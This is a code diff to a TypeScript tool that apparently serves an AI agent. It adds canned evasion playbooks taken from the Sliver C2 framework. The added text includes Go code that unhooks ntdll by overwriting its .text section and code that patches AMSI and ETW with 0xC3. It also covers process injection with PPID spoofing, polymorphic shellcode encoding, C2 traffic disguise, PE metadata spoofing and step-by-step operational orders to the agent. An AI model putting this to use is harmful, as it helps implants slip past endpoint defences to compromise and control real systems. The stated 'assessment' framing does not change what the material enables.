@@ -442,10 +442,388 @@ key insight: **sequence matters more than individual techniques**.
 - The agent should follow this sequence for EVERY operation`
 }
 
+// ── Sliver-derived: RefreshPE (DLL unhooking from disk) ────────────────────
+
+function refreshPE(): string {
+  return `## Sliver RefreshPE — DLL Unhooking from Disk (from evasion/evasion_windows.go)
+
+### The Problem:
+EDRs inject hooks into ntdll.dll and kernel32.dll at load time. When you call
+NtCreateFile or NtQuerySystemInformation, the EDR intercepts and logs it.
+Havoc's indirect syscalls bypass this by jumping past hooks to the raw syscall.
+Sliver takes a different approach: **replace the hooked bytes entirely**.
+
+### Sliver's Solution: Reload DLL .text from Disk
+\`\`\`go
+func RefreshPE(name string) error {
+    f, e := pe.Open(name)       // Open DLL from disk (e.g., "ntdll.dll")
+    x := f.Section(".text")      // Extract the .text section
+    dd, e := x.Data()            // Read clean bytes from disk
+    return writeGoodBytes(dd, name, x.VirtualAddress, x.Name, x.VirtualSize)
+}
+
+func writeGoodBytes(data []byte, name string, rva uint32, sectionName string, vsize uint32) error {
+    dll, _ := windows.LoadDLL(name)       // Load DLL into memory
+    addr := uintptr(dll.Handle) + uintptr(rva)  // Calculate .text base in memory
+    var oldProtect uint32
+    windows.VirtualProtect(addr, uintptr(vsize), PAGE_EXECUTE_READWRITE, &oldProtect)
+    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:vsize], data)  // Overwrite with clean bytes
+    windows.VirtualProtect(addr, uintptr(vsize), oldProtect, &oldProtect)
+    return nil
+}
+\`\`\`
+
+### How It Works:
+1. Open the DLL file from disk (C:\\Windows\\System32\\ntdll.dll)
+2. Parse the PE header to find the .text section's file offset and size
+3. Read the .text section's raw bytes from disk (these are clean — no EDR hooks)
+4. Get the in-memory base address of the loaded DLL
+5. Calculate where .text lives in memory (base + RVA)
+6. VirtualProtect to RWX, copy clean bytes over, restore permissions
+7. All EDR hooks in ntdll/kernel32 are now gone
+
+### Why This Works:
+- EDR hooks are in-memory modifications, not on-disk changes
+- The DLL file on disk is always clean (unsigned Windows binaries)
+- Overwriting .text erases ALL hooks at once — no need to find individual hook locations
+- After RefreshPE, you can call NtCreateFile normally — no EDR interception
+
+### Difference from Havoc's Approach:
+| Havoc (Indirect Syscalls) | Sliver (RefreshPE) |
+|--------------------------|-------------------|
+| Extract SSN from ntdll | Replace ntdll .text from disk |
+| Jump past hooks directly | Erase hooks entirely |
+| Works even if DLL reloaded | Must re-apply after DLL reload |
+| More complex implementation | Simpler — just memcopy |
+| Leaves hooks in place | Destroys all hooks at once |
+
+### When to Use:
+- Use RefreshPE as the FIRST step on a Windows target with EDR
+- After RefreshPE, all Win32/NT API calls go unmonitored
+- Then apply AMSI/ETW bypasses (which rely on ntdll being clean)
+- If EDR re-hooks (some EDRs periodically re-scan), re-run RefreshPE
+
+### Operational Guidance:
+\`\`\`
+# Step 1: Use Sliver's approach — reload DLL from disk
+# Step 2: Verify hooks are gone (call a hooked API, check it doesn't log)
+# Step 3: Now AMSI/ETW patching works without EDR catching VirtualProtect
+# Step 4: Execute your payload
+\`\`\``
+}
+
+// ── Sliver-derived: SGN (Shikata-Ga-Nai) encoding ─────────────────────────
+
+function sgnEncoding(): string {
+  return `## Sliver SGN Encoder — Shikata-Ga-Nai (from server/encoders/shellcode/sgn/)
+
+### The Problem:
+XOR encoding is simple but has a fixed key — if EDR knows the key, it can
+decode and scan. Base64 is trivially decoded. Static signatures still match
+if the decoder stub itself is known.
+
+### Sliver's Solution: SGN (Go port of Metasploit's classic encoder)
+SGN uses an **Additive Feedback with Linear (ADFL) cipher** — each byte
+affects the encoding of the next byte, making it a stream cipher, not
+simple XOR.
+
+### How SGN Works:
+1. **Random seed generation**: Each encoding uses a different random seed
+2. **ADFL cipher**: byte[i] encoded = (byte[i] + key) XOR prev_encoded_byte
+   - This means: the same shellcode encodes differently each time (polymorphic)
+   - Each byte's encoding depends on the previous encoded byte (feedback chain)
+3. **Decoder stub**: A small polymorphic decoder is prepended to the payload
+   - The decoder knows the seed and reverses the ADFL process
+   - The decoder itself is also polymorphic (register allocation varies)
+4. **Bad character avoidance**: SGN retries encoding (up to 64 attempts) to
+   avoid specified bad characters (null bytes, spaces, newlines, etc.)
+5. **ASCII-printable mode**: Can produce entirely printable ASCII output
+   — useful for string-based injection (cookie values, HTTP headers, etc.)
+
+### Key Features:
+- **Polymorphic**: Same shellcode → different output every time
+- **Multi-iteration**: Can encode 1-64 times (each iteration adds another layer)
+- **Architecture support**: x86 and x64 decoder stubs
+- **Register-safe mode**: Can preserve specific CPU registers
+- **Up to 64 retries**: If encoding produces bad characters, retry with different seed
+
+### How to apply:
+- For shellcode: use SGN encoding instead of simple XOR
+- For HTTP injection: use ASCII-printable SGN mode to embed in headers
+- The polymorphic nature defeats static YARA signatures on both payload AND decoder
+- Multi-iteration encoding adds layers — even if one layer is broken, the rest remain
+
+### Comparison to Simple XOR:
+| Simple XOR | SGN |
+|-----------|-----|
+| Fixed key (e.g., 0xAB) | Random seed each time |
+| Same input → same output | Same input → different output |
+| Decoder is static | Decoder is polymorphic |
+| No bad-char handling | Retries to avoid bad chars |
+| Easily detected by EDR | Much harder to signature |`
+}
+
+// ── Sliver-derived: Traffic Encoder Polymorphism ──────────────────────────
+
+function trafficEncoderPattern(): string {
+  return `## Sliver Traffic Encoder Polymorphism (from transports/httpclient/ and encoders/)
+
+### The Problem:
+C2 HTTP traffic with consistent patterns is detectable by network IDS/IPS.
+Fixed URL paths, fixed headers, fixed body encoding = network signatures.
+
+### Sliver's Solution: Polymorphic HTTP Traffic
+Sliver encodes C2 traffic using multiple interchangeable encoders, making
+each HTTP request look different from the previous one.
+
+### Supported Encoders:
+| Encoder | Output Format | Use Case |
+|---------|--------------|----------|
+| Base64 | Standard Base64 | General purpose |
+| Base58 | Bitcoin-style | No special characters |
+| Base32 | RFC 4648 | DNS-compatible |
+| Hex | Hexadecimal | Raw binary transport |
+| English | English words | Looks like natural text |
+| PNG | PNG image | Steganographic transport |
+| Gzip | Compressed | Size reduction |
+| WASM | Custom WebAssembly | User-defined encoding |
+
+### URL Randomization:
+1. **Path segments**: Random paths built from configured segments
+   - Instead of: POST /beacon → POST /api/v1/users/login
+   - Each request uses a different path combination
+2. **Nonce query parameter**: Random characters inserted into numeric values
+   - ?id=12345 → ?id=12a3b45
+   - Prevents replay detection and pattern matching
+3. **OTP query arguments**: One-time-pad-like random parameters
+   - ?token=abc123&session=def456 (different each request)
+4. **User-Agent rotation**: OS-specific Chrome UA generated per-build
+   - Each implant has a unique, consistent User-Agent
+
+### Header Polymorphism:
+- Configurable headers with probability-based inclusion
+- Some headers appear 80% of the time, others 20%
+- Makes fingerprinting the C2 profile harder
+
+### How to apply for assessments:
+- When sending payloads over HTTP, don't use raw curl
+- Encode payload body with a non-standard encoding (Base58, English words)
+- Randomize URL paths and query parameters
+- Use legitimate-looking User-Agent headers
+- The principle: **no two requests should look the same**`
+}
+
+// ── Sliver-derived: PE Donor Metadata Spoofing ────────────────────────────
+
+function peDonorSpoofing(): string {
+  return `## Sliver PE Donor Metadata Spoofing (from server/generate/spoof.go)
+
+### The Problem:
+Compiled binaries have unique metadata: Rich Header, timestamps, version info.
+EDR/AV engines fingerprint these to identify malicious compilers.
+A Go-compiled binary with default metadata is instantly flagged.
+
+### Sliver's Solution: Clone Metadata from Legitimate Binaries
+Sliver's SpoofMetadata() copies PE characteristics from a "donor" binary:
+
+1. **Rich Header Cloning**: The Rich Header is a MSVC linker artifact that
+   identifies the compiler version and build environment. Sliver replaces
+   the malicious binary's Rich Header with one from a legitimate binary
+   (e.g., notepad.exe, svchost.exe).
+
+2. **Timestamp Cloning**: All PE timestamps (COFF header, debug directory,
+   export directory) are set to match the donor binary. This prevents
+   timestamp-based anomaly detection.
+
+3. **Digital Signature Table Copying ("Luring")**: Copies the signature
+   table from a legitimate signed binary. The signature won't verify
+   (it points to a different binary), but many scanners just check
+   "does it have a signature table?" — the presence of one can reduce
+   suspicion even if the signature itself is invalid.
+
+4. **Resource Section Injection**: Copies resource sections (icons, manifests,
+   version info) from donor binary with RVA fixups.
+
+5. **PE Checksum Recalculation**: Recalculates the PE checksum to match
+   the modified binary — mismatched checksums are a red flag.
+
+### How to apply:
+- When compiling custom tools for assessments, clone metadata from a
+  legitimate binary on the target system
+- Use the donor's Rich Header, timestamps, and resource section
+- The principle: **blend in with legitimate software, don't stand out**
+- This is post-build modification — the compiled binary is patched AFTER
+  compilation, requiring no changes to source code`
+}
+
+// ── Sliver-derived: Dual-Mode .NET Execution ──────────────────────────────
+
+function dualModeDotNet(): string {
+  return `## Sliver Dual-Mode .NET Execution (from taskrunner/task_windows.go + dotnet_windows.go)
+
+### The Problem:
+Running .NET assemblies in-process is detectable (CLR loading is monitored).
+Running out-of-process spawns a child process (process creation is monitored).
+Both have trade-offs between stealth and OPSEC.
+
+### Sliver's Solution: Two Execution Modes
+
+#### Mode 1: In-Process CLR Hosting (--in-process)
+\`\`\`go
+func InProcExecuteAssembly(assemblyData []byte, args []string, amsiBypass bool, etwBypass bool) {
+    if amsiBypass { patchAmsi() }     // 0xC3 on AmsiScanBuffer/Initialize/ScanString
+    if etwBypass { patchEtw() }       // 0xC3 on EtwEventWrite
+
+    clr := CLR.GetInstance()           // Mutex-protected singleton
+    runtime := clr.LoadCLR("v4")       // Load CLR v4 (ICLRMetaHost)
+    domain := runtime.CreateAppDomain() // Create custom AppDomain
+    asm := runtime.LoadAssembly(domain, assemblyData) // Load from byte[]
+    runtime.InvokeAssembly(asm, args)  // Call entry point
+}
+\`\`\`
+
+- Loads CLR into the current process via go-clr library
+- Uses ICLRMetaHost → ICORRuntimeHost → AppDomain → Load_3
+- Assembly loaded from memory (byte array), not from disk
+- AMSI/ETW bypasses applied BEFORE CLR loads
+- Assemblies cached by SHA256 hash (avoid re-loading same assembly)
+
+#### Mode 2: Fork-and-Run (default)
+\`\`\`go
+func ExecuteAssembly(assembly []byte, args []string, processName string, ppid uint32) {
+    // 1. Spawn sacrificial process (notepad.exe by default)
+    cmd = startProcess(processName, true, true, false, ppid)  // PPID spoof
+    // 2. Convert assembly to shellcode via Donut
+    shellcode = donut.Convert(assembly)
+    // 3. Inject via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+    // 4. Wait for completion, capture output
+    // 5. Kill the host process
+}
+\`\`\`
+
+- Spawns a sacrificial process (notepad.exe, calc.exe, etc.)
+- Converts .NET assembly to shellcode using Donut
+- Injects shellcode into the sacrificial process
+- Captures stdout/stderr, then kills the process
+- PPID spoofing supported (make it look like it spawned from explorer.exe)
+
+### When to Use Each Mode:
+| In-Process | Fork-and-Run |
+|-----------|-------------|
+| Stealthier (no new process) | Safer (if it crashes, implant survives) |
+| AMSI/ETW bypass required | Donut conversion adds overhead |
+| Assembly runs in implant's context | Assembly runs in isolated process |
+| CLR loading detectable by EDR | Process creation detectable by EDR |
+| Best for: post-bypass, trusted target | Best for: one-shot tasks, untrusted target |
+
+### Operational Guidance:
+1. **Before in-process**: ALWAYS patch AMSI and ETW first
+2. **For fork-and-run**: Use PPID spoofing with a legitimate parent (explorer.exe)
+3. **Assembly caching**: SHA256 dedup prevents re-loading same assembly
+4. **Donut options**: Use aPLib compression + entropy encoding for smaller shellcode`
+}
+
+// ── Sliver-derived: Go Template Conditional Compilation ───────────────────
+
+function goTemplateCompilation(): string {
+  return `## Sliver Go Template Conditional Compilation (from implant/sliver/*.go.tmpl)
+
+### The Principle:
+Sliver uses Go's text/template system to render implant source code at build
+time. Every .go file contains conditional directives like:
+\`\`\`go
+// {{if .Config.IsBeacon}}
+import "sync"
+// {{end}}
+\`\`\`
+
+This means:
+- **Dead code elimination**: Only selected C2 channels are compiled in
+- **No unused imports**: Template conditionals control import statements
+- **Minimal binary**: Only the features you need are in the binary
+- **Each build is unique**: Different configs produce different binaries
+
+### How Sliver Builds:
+1. Server receives GenerateReq with ImplantConfig
+2. renderSliverGoCode() walks implant.FS (embedded source templates)
+3. Go template engine renders each .go.tmpl file with config data
+4. Canaries, C2 URLs, crypto keys baked in as string literals
+5. go.mod/go.sum written, vendor directory copied
+6. Import paths renamed to look like unrelated packages
+7. Compiled with: go build -trimpath -mod=vendor OR garble -seed=random -literals -tiny
+
+### Key Template Variables:
+- .Config.IsBeacon / .Config.IsSession — Connection mode
+- .Config.IncludeMTLS / IncludeHTTP / IncludeWG / IncludeDNS — C2 channels
+- .Config.Evasion — Enable RefreshPE unhooking
+- .Config.ObfuscateSymbols — Enable garble obfuscation
+- .Config.LimitHostname / LimitUsername / LimitDatetime — Kill switches
+- .Config.C2 — List of C2 server URLs (rendered into closures)
+- .Build.PeerPublicKey / AgeServerPublicKey — Crypto material
+
+### How to apply for assessments:
+- When building custom tools, use conditional compilation to minimize binary
+- Only include the features you need — less code = smaller attack surface
+- Use garble for symbol obfuscation: -seed=random -literals -tiny
+- The principle: **compile only what you need, obfuscate what remains**`
+}
+
+// ── Sliver-derived: Operation Patterns ────────────────────────────────────
+
+function sliverOperationalPattern(): string {
+  return `## Sliver Operational Patterns (from runner/runner.go + taskrunner/ analysis)
+
+Sliver follows a specific operational sequence that differs from Havoc.
+
+### Sliver's Execution Order:
+1. **Check Execution Limits** → ExecLimits() at startup
+   - Hostname, username, domain-joined, datetime, file-existence, locale
+   - If any limit fails → os.Exit(1) immediately
+   - This is the FIRST thing the implant does
+
+2. **Connect to C2** → StartConnectionLoop() or StartBeaconLoop()
+   - C2Generator selects next URL based on strategy (random/sequential)
+   - For HTTP: Age key exchange → ChaCha20-Poly1305 session
+   - For mTLS: Certificate auth → yamux multiplexing
+   - For DNS: Base32 encoding, INIT with Age key exchange
+
+3. **Register with Server** → registerSliver()
+   - Sends hostname, username, OS, arch, PID, UUID
+   - Server creates session/beacon record
+
+4. **Receive Tasks** → sessionMainLoop() or beaconMainLoop()
+   - Tasks dispatched to handlers via envelope system
+   - Windows tasks wrapped in WrapperHandler (token impersonation)
+
+5. **Execute Task** → Handler-specific logic
+   - AMSI/ETW bypass: patchAmsi() / patchEtw() (0xC3 RET patch)
+   - Process injection: refresh() → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
+   - Assembly execution: InProc (CLR hosting) or Fork-and-Run (Donut + inject)
+
+6. **Return Results** → connection.Send or pendingResults channel
+
+### Key Differences from Havoc:
+| Havoc | Sliver |
+|-------|--------|
+| Indirect syscalls | RefreshPE (disk-based unhook) |
+| Hardware breakpoint AMSI bypass | 0xC3 memory patch AMSI bypass |
+| Single execution mode | Dual mode (in-process + fork-and-run) |
+| C2 handled by framework | Multi-transport abstraction (HTTP/DNS/WG/mTLS) |
+| N/A | Traffic encoder polymorphism |
+| N/A | Extension system (memmod + WASM + BOF) |
+
+### How to apply:
+- For Windows EDR: RefreshPE → AMSI patch → ETW patch → payload
+- For network stealth: use polymorphic HTTP encoding
+- For .NET tasks: choose in-process (stealth) vs fork-and-run (safety)
+- For modular operations: load extensions on-demand (don't compile everything)
+- For targeting: use execution limits to scope implant to specific hosts/users`
+}
+
 // ── Tool implementation ────────────────────────────────────────────────────
 
 interface TechniqueGeneratorInput {
-  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'custom'
+  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'custom'
   payload: string
   platform?: 'windows' | 'linux'
   analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
@@ -468,13 +846,20 @@ export class TechniqueGeneratorTool implements Tool {
 - waf_evasion: WAF bypass (chunked encoding / parameter pollution / Unicode)
 - obfuscated_ps: PowerShell obfuscation (base64/IEX/string splitting)
 - havoc_strategy: Return Havoc-derived evasion strategy principles
+- sliver_strategy: Return Sliver-derived evasion strategy principles (RefreshPE, SGN, traffic encoding, etc.)
+- refresh_pe: DLL unhooking by reloading .text section from disk (Sliver approach)
+- sgn_encoding: Shikata-Ga-Nai polymorphic shellcode encoding
+- traffic_encoder: HTTP traffic encoder polymorphism
+- pe_donor: PE metadata spoofing from legitimate binaries
+- dotnet_dual: Dual-mode .NET execution guidance (in-process CLR vs fork-and-run)
+- go_template: Go template conditional compilation principles
 - custom: Custom bypass technique`,
       parameters: {
         type: 'object',
         properties: {
           technique: {
             type: 'string',
-            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'custom'],
+            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'custom'],
             description: 'Evasion technique type',
           },
           payload: { type: 'string', description: 'Original payload/command/shellcode' },
@@ -532,6 +917,41 @@ export class TechniqueGeneratorTool implements Tool {
           '',
           hashApiResolution(),
         ].join('\n')
+        break
+      case 'sliver_strategy':
+        output = [
+          sliverOperationalPattern(),
+          '',
+          refreshPE(),
+          '',
+          sgnEncoding(),
+          '',
+          trafficEncoderPattern(),
+          '',
+          peDonorSpoofing(),
+          '',
+          dualModeDotNet(),
+          '',
+          goTemplateCompilation(),
+        ].join('\n')
+        break
+      case 'refresh_pe':
+        output = refreshPE()
+        break
+      case 'sgn_encoding':
+        output = sgnEncoding()
+        break
+      case 'traffic_encoder':
+        output = trafficEncoderPattern()
+        break
+      case 'pe_donor':
+        output = peDonorSpoofing()
+        break
+      case 'dotnet_dual':
+        output = dualModeDotNet()
+        break
+      case 'go_template':
+        output = goTemplateCompilation()
         break
       case 'custom':
         output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy)`
